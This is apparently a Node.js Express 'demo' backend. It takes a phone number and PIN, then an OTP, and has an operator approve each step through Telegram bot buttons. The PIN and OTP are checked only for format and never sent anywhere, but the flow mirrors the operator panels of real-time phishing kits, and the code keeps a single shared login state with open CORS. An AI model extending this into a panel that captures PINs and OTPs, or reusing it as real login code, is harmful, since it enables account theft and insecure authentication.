const express = require("express");
const cors = require("cors");

const app = express();

app.use(cors());
app.use(express.json());


// ==============================
// TELEGRAM SETTINGS
// ==============================

const TELEGRAM_BOT_TOKEN =
    process.env.TELEGRAM_BOT_TOKEN;

const ADMIN_CHAT_ID =
    process.env.ADMIN_CHAT_ID;


// ==============================
// DEMO LOGIN DATA
// ==============================

let loginRequest = null;


// ==============================
// TELEGRAM API
// ==============================

async function telegramRequest(method, data) {

    const response = await fetch(
        `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/${method}`,
        {
            method: "POST",

            headers: {
                "Content-Type": "application/json"
            },

            body: JSON.stringify(data)
        }
    );

    return await response.json();
}


// ==============================
// HOME / TEST
// ==============================

app.get("/", function(request, response) {

    response.send("Backend is running");

});


// ==============================
// LOGIN
// ==============================

app.post("/login", async function(request, response) {

    let phone = request.body.phone;
    let pin = request.body.pin;


    if (!phone || !pin) {

        response.status(400).json({

            success: false,

            message:
                "Please enter phone number and PIN"

        });

        return;
    }


    // Demo PIN must be 6 digits

    if (!/^\d{6}$/.test(pin)) {

        response.json({

            success: false,

            message:
                "Demo PIN must be 6 digits"

        });

        return;
    }


    // ==============================
    // CREATE DEMO LOGIN REQUEST
    // ==============================

    loginRequest = {

        id: Date.now(),

        phone: phone,

        status: "pending",

        createdAt: Date.now(),

        otpStatus: "not_entered"

    };


    console.log(
        "New demo login request:",
        loginRequest.id
    );


    // ==============================
    // TELEGRAM LOGIN MESSAGE
    // ==============================

    try {

        let result =
            await telegramRequest(
                "sendMessage",
                {

                    chat_id:
                        ADMIN_CHAT_ID,

                    text:
                        "🔔 DEMO LOGIN REQUEST\n\n" +

                        "Phone: " +
                        phone +

                        "\nRequest ID: " +
                        loginRequest.id +

                        "\n\nChoose an action:",


                    reply_markup: {

                        inline_keyboard: [

                            [

                                {
                                    text:
                                        "✅ Approve",

                                    callback_data:
                                        "approve_login_" +
                                        loginRequest.id
                                },

                                {
                                    text:
                                        "❌ Reject",

                                    callback_data:
                                        "reject_login_" +
                                        loginRequest.id
                                }

                            ]

                        ]

                    }

                }
            );


        console.log(
            "Telegram login result:",
            result.ok
        );


    } catch (error) {

        console.log(
            "Telegram error:",
            error.message
        );

    }


    response.json({

        success: true,

        message:
            "Waiting for admin approval"

    });

});


// ==============================
// LOGIN STATUS
// ==============================

app.get(
    "/login-status",
    function(request, response) {

        if (loginRequest === null) {

            response.json({

                status: "none"

            });

            return;
        }


        response.json({

            status:
                loginRequest.status

        });

    }
);


// ==============================
// DEMO OTP SUBMISSION
// ==============================

app.post(
    "/verify-otp",
    async function(request, response) {

        let otp = request.body.otp;


        // ==============================
        // CHECK LOGIN APPROVAL
        // ==============================

        if (
            loginRequest === null ||
            loginRequest.status !== "approved"
        ) {

            response.json({

                success: false,

                message:
                    "Login has not been approved"

            });

            return;
        }


        // ==============================
        // CHECK DEMO OTP FORMAT
        // ==============================

        if (!/^\d{6}$/.test(otp)) {

            response.json({

                success: false,

                message:
                    "Demo OTP must be 6 digits"

            });

            return;
        }


        // ==============================
        // MARK DEMO OTP AS PENDING
        // ==============================

        loginRequest.otpStatus =
            "pending";


        console.log(
            "Demo OTP submitted for admin approval"
        );


        // ==============================
        // SEND MASKED OTP NOTIFICATION
        // ==============================

        try {

            let result =
                await telegramRequest(
                    "sendMessage",
                    {

                        chat_id:
                            ADMIN_CHAT_ID,

                        text:
                            "🔐 DEMO OTP SUBMITTED\n\n" +

                            "Phone: " +
                            loginRequest.phone +


                            "\nRequest ID: " +
                            loginRequest.id +

                            "\n\nChoose an action:",


                        reply_markup: {

                            inline_keyboard: [

                                [

                                    {
                                        text:
                                            "✅ Approve OTP",

                                        callback_data:
                                            "approve_otp_" +
                                            loginRequest.id
                                    },

                                    {
                                        text:
                                            "❌ Reject OTP",

                                        callback_data:
                                            "reject_otp_" +
                                            loginRequest.id
                                    }

                                ]

                            ]

                        }

                    }
                );


            console.log(
                "Telegram OTP result:",
                result.ok
            );


            // ==============================
            // TELEGRAM FAILED
            // ==============================

            if (!result.ok) {

                loginRequest.otpStatus =
                    "not_entered";


                response.json({

                    success: false,

                    message:
                        "Could not send demo approval request"

                });

                return;
            }


        } catch (error) {

            console.log(
                "Telegram error:",
                error.message
            );


            loginRequest.otpStatus =
                "not_entered";


            response.json({

                success: false,

                message:
                    "Could not contact Telegram"

            });

            return;
        }


        // ==============================
        // SUCCESS
        // ==============================

        response.json({

            success: true,

            message:
                "OTP submitted. Waiting for admin approval."

        });

    }
);


// ==============================
// OTP STATUS
// ==============================

app.get(
    "/otp-status",
    function(request, response) {

        if (loginRequest === null) {

            response.json({

                status: "none"

            });

            return;
        }


        response.json({

            status:
                loginRequest.otpStatus

        });

    }
);


// ==============================
// TELEGRAM BUTTON HANDLER
// ==============================

async function handleTelegramButton(
    callbackQuery
) {

    let chatId =
        callbackQuery.message.chat.id;


    // ==============================
    // CHECK ADMIN
    // ==============================

    if (
        String(chatId) !==
        String(ADMIN_CHAT_ID)
    ) {

        await telegramRequest(
            "answerCallbackQuery",
            {

                callback_query_id:
                    callbackQuery.id,

                text:
                    "Not authorized"

            }
        );

        return;
    }


    // ==============================
    // CHECK REQUEST
    // ==============================

    if (loginRequest === null) {

        await telegramRequest(
            "answerCallbackQuery",
            {

                callback_query_id:
                    callbackQuery.id,

                text:
                    "No active request"

            }
        );

        return;
    }


    // ==============================
    // READ BUTTON DATA
    // ==============================

    let parts =
        callbackQuery.data.split("_");


    let command =
        parts[0];

    let stage =
        parts[1];

    let requestId =
        parts[2];


    // ==============================
    // CHECK REQUEST ID
    // ==============================

    if (
        String(requestId) !==
        String(loginRequest.id)
    ) {

        await telegramRequest(
            "answerCallbackQuery",
            {

                callback_query_id:
                    callbackQuery.id,

                text:
                    "This request is no longer active"

            }
        );

        return;
    }


    // ==============================
    // CHECK 5 MINUTE WINDOW
    // ==============================

    let timePassed =
        Date.now() -
        loginRequest.createdAt;


    if (
        timePassed >
        5 * 60 * 1000
    ) {

        loginRequest.status =
            "expired";


        await telegramRequest(
            "answerCallbackQuery",
            {

                callback_query_id:
                    callbackQuery.id,

                text:
                    "Request expired"

            }
        );

        return;
    }


    // ==============================
    // LOGIN APPROVE
    // ==============================

    if (
        stage === "login" &&
        command === "approve"
    ) {

        loginRequest.status =
            "approved";


        await telegramRequest(
            "answerCallbackQuery",
            {

                callback_query_id:
                    callbackQuery.id,

                text:
                    "Login approved ✅"

            }
        );


        await telegramRequest(
            "editMessageText",
            {

                chat_id:
                    ADMIN_CHAT_ID,

                message_id:
                    callbackQuery.message.message_id,

                text:
                    "✅ DEMO LOGIN APPROVED\n\n" +

                    "Phone: " +
                    loginRequest.phone +


                    "\nRequest ID: " +
                    loginRequest.id +

                    "\n\nUser can continue to OTP."

            }
        );


        return;
    }


    // ==============================
    // LOGIN REJECT
    // ==============================

    if (
        stage === "login" &&
        command === "reject"
    ) {

        loginRequest.status =
            "rejected";


        await telegramRequest(
            "answerCallbackQuery",
            {

                callback_query_id:
                    callbackQuery.id,

                text:
                    "Login rejected ❌"

            }
        );


        await telegramRequest(
            "editMessageText",
            {

                chat_id:
                    ADMIN_CHAT_ID,

                message_id:
                    callbackQuery.message.message_id,

                text:
                    "❌ DEMO LOGIN REJECTED\n\n" +

                    "Phone: " +
                    loginRequest.phone +

                    "\nRequest ID: " +
                    loginRequest.id

            }
        );


        return;
    }


    // ==============================
    // OTP APPROVE
    // ==============================

    if (
        stage === "otp" &&
        command === "approve"
    ) {

        loginRequest.otpStatus =
            "approved";


        loginRequest.status =
            "completed";


        await telegramRequest(
            "answerCallbackQuery",
            {

                callback_query_id:
                    callbackQuery.id,

                text:
                    "Demo OTP approved ✅"

            }
        );


        await telegramRequest(
            "editMessageText",
            {

                chat_id:
                    ADMIN_CHAT_ID,

                message_id:
                    callbackQuery.message.message_id,

                text:
                    "✅ DEMO OTP APPROVED\n\n" +

                    "Phone: " +
                    loginRequest.phone +


                    "\nRequest ID: " +
                    loginRequest.id +

                    "\n\nUser can continue to Home."

            }
        );


        return;
    }


    // ==============================
    // OTP REJECT
    // ==============================

    if (
        stage === "otp" &&
        command === "reject"
    ) {

        loginRequest.otpStatus =
            "rejected";


        await telegramRequest(
            "answerCallbackQuery",
            {

                callback_query_id:
                    callbackQuery.id,

                text:
                    "Demo OTP rejected ❌"

            }
        );


        await telegramRequest(
            "editMessageText",
            {

                chat_id:
                    ADMIN_CHAT_ID,

                message_id:
                    callbackQuery.message.message_id,

                text:
                    "❌ DEMO OTP REJECTED\n\n" +

                    "Phone: " +
                    loginRequest.phone +

                    "\nRequest ID: " +
                    loginRequest.id +

                    "\n\nUser can try again."

            }
        );


        return;
    }

}


// ==============================
// TELEGRAM POLLING
// ==============================

async function startTelegramPolling() {

    if (
        !TELEGRAM_BOT_TOKEN ||
        !ADMIN_CHAT_ID
    ) {

        console.log(
            "Telegram environment variables are missing"
        );

        return;
    }


    console.log(
        "Telegram bot starting..."
    );


    // Remove webhook

    await telegramRequest(
        "deleteWebhook",
        {
            drop_pending_updates: false
        }
    );


    let offset = 0;


    // Keep checking Telegram

    while (true) {

        try {

            let result =
                await telegramRequest(
                    "getUpdates",
                    {

                        offset: offset,

                        timeout: 20

                    }
                );


            if (result.ok) {

                for (
                    let update of result.result
                ) {

                    offset =
                        update.update_id + 1;


                    if (
                        update.callback_query
                    ) {

                        await handleTelegramButton(
                            update.callback_query
                        );

                    }

                }

            }

        } catch (error) {

            console.log(
                "Telegram polling error:",
                error.message
            );


            await new Promise(
                function(resolve) {

                    setTimeout(
                        resolve,
                        3000
                    );

                }
            );

        }

    }

}


// ==============================
// SERVER
// ==============================

const PORT =
    process.env.PORT || 5000;


app.listen(
    PORT,
    function() {

        console.log(
            "Server is running on port " +
            PORT
        );


        startTelegramPolling();

    }
);
